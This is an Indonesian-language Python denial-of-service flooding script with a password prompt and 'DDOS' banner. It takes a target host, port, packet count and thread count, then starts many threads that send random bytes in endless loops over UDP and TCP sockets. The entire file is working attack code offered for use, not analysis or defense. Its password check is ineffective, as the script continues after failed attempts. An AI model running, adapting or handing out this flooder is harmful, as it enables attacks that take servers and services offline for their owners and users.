##!/usr/bin/env python3
#REMAKE BY Xrian
#TOOLS BUILD 26/10/2021
#V3
import random
import socket
import threading
import sys
import os
import signal
import time
from os import system, name

os.system("clear")
print("""
\033[91m 
 ____  _  __       _ 
 |  _ \(_)/ _| __ _(_)
 | |_) | | |_ / _` | |
 |  _ <| |  _| (_| | |
 |_| \_\_|_|  \__, |_|
                 |_|  
""")

password ="Rifqi"

for i in range(3):
	pwd = input("\033[93m> Masukan Password : ")
	j=3
	if(pwd==password):
		time.sleep(5)
		print("\033[92mBerak Dulu Om")
		break
	else:
		time.sleep(5)
		print("\033[91m> Password Salah")
		continue
time.sleep(5)
print("\033[94m> Password Benar")

# Script


os.system("clear")
print("""
\033[91m
██████╗░██████╗░░█████╗░░██████╗
██╔══██╗██╔══██╗██╔══██╗██╔════╝
██║░░██║██║░░██║██║░░██║╚█████╗░
██║░░██║██║░░██║██║░░██║░╚═══██╗
██████╔╝██████╔╝╚█████╔╝██████╔╝
╚═════╝░╚═════╝░░╚════╝░╚═════╝░
""")
ip = str(input(" Host/Ip:"))
port = int(input(" Port:"))
choice = str(input(" YAKEN DDOS?(y/n):"))
times = int(input(" Packets per one connection:"))
threads = int(input(" Threads:"))
def run():
	data = random._urandom(1024)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +" Rifqi Nih Dekk!!!")
		except:
			print("[!] Ada paket Nichh!!!")

def run2():
	data = random._urandom(24)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +" Rifqi Nih Dekk!!!")
		except:
			s.close()
			print("[*] Ada paket Nichh")

def run3():
	data = random._urandom(1866)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +" Rifqi Nih Dekk!!!")
		except:
			s.close()
			print("[*] Ada paket Nichh")

def run4():
	data = random._urandom(1256)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +" Rifqi Nih Dekk!!!")
		except:
			s.close()
			print("[*] Ada paket Nichh")

def run5():
	data = random._urandom(1000)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +" Rifqi Nih Dekk!!!")
		except:
			s.close()
			print("[*] Ada paket Nichh")
			
def run6():
	data = random._urandom(18)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +" Rifqi Nih Dekk!!!")
		except:
			s.close()
			print("[*] Ada paket Nichh")
			
def run7():
	data = random._urandom(1800)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +" Rifqi Nih Dekk!!!")
		except:
			s.close()
			print("[*] Ada paket Nichh")
			
def run8():
	data = random._urandom(2000)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +" Rifqi Nih Dekk!!!")
		except:
			s.close()
			print("[*] Ada paket Nichh")
			
def run9():
	data = random._urandom(20)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +" Rifqi Nih Dekk!!!")
		except:
			s.close()
			print("[*] Ada paket Nichh")

for y in range(threads):
	if choice == 'y':
		th = threading.Thread(target = run)
		th.start()
		th = threading.Thread(target = run2)
		th.start()
		th = threading.Thread(target = run3)
		th.start()
		th = threading.Thread(target = run4)
		th.start()
		th = threading.Thread(target = run5)
		th.start()
		th = threading.Thread(target = run6)
		th.start()
		th = threading.Thread(target = run7)
		th.start()
		th = threading.Thread(target = run8)
		th.start()
	else:
		th = threading.Thread(target = run9)
		th.start()
